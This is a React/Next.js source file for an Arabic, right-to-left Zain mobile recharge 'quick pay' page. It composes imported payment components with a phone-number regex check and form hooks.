"use client"
import { useState } from "react"
import { ArrowRight, Plus } from "lucide-react"
import { PaymentHeader } from "@/components/payment/payment-header"
import { PaymentTabs } from "@/components/payment/payment-tabs"
import { NumberTypeSelector } from "@/components/payment/number-type-selector"
import { PhoneInput } from "@/components/payment/phone-input"
import { AmountSelector } from "@/components/payment/amount-selector"
import { OrderSummary } from "@/components/payment/order-summary"
import { PaymentButton } from "@/components/payment/payment-button"
import { usePaymentForm } from "./lib/use-payment-form"
import { useLocation } from "./lib/use-location"

export default function ZainPayment() {
  const [selectedTab, setSelectedTab] = useState("bill")

  const { formData, updateFormData, balanceData, isLoadingBalance, balanceError, isSubmitted, loading, handleSubmit } =
    usePaymentForm()

  useLocation()
  const isPhoneValid = /^9\d{7}$/.test(formData.phoneNumber);

 
  return (
    <div className="max-w-md mx-auto bg-gradient-to-b from-white to-gray-50 min-h-screen" dir="rtl">
      <PaymentHeader />
      <div className="p-5">
        <div className="flex items-center mb-6">
          <ArrowRight className="text-[#2d1a45] mr-2" size={20} />
          <h2 className="text-2xl font-bold text-[#2d1a45]">الدفع السريع</h2>
        </div>
        <PaymentTabs selectedTab={selectedTab} onTabChange={setSelectedTab} />
        <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
          <div className="text-right mb-4">
            <p className="text-[#2d1a45] font-medium">أريد أن أعيد التعبئة </p>
          </div>
          <NumberTypeSelector value={formData.numberType} onChange={(value) => updateFormData({ numberType: value })} />
          <PhoneInput
            value={formData.phoneNumber}
            onChange={(value) => updateFormData({ phoneNumber: value })}
            isLoadingBalance={isLoadingBalance}
            balanceData={balanceData}
            balanceError={balanceError}
          />
          <AmountSelector
            value={formData.selectedAmount}
            onChange={(value) => updateFormData({ selectedAmount: value })}
          />
          <button className="w-full p-3 border-2 border-[#d13c8c] text-[#d13c8c] rounded-lg flex items-center justify-center hover:bg-pink-50 transition-colors">
            <Plus className="h-5 w-5 ml-2" />
            <span>أضف رقم آخر</span>
          </button>
        </div>
        <OrderSummary selectedAmount={formData.selectedAmount} fees={formData.fees} total={formData.total} />
        <PaymentButton isValidPhoneNumber={isPhoneValid} isSubmitted={isSubmitted} phoneNumber={formData.phoneNumber} onSubmit={handleSubmit} />
      </div>
    </div>
  )
}
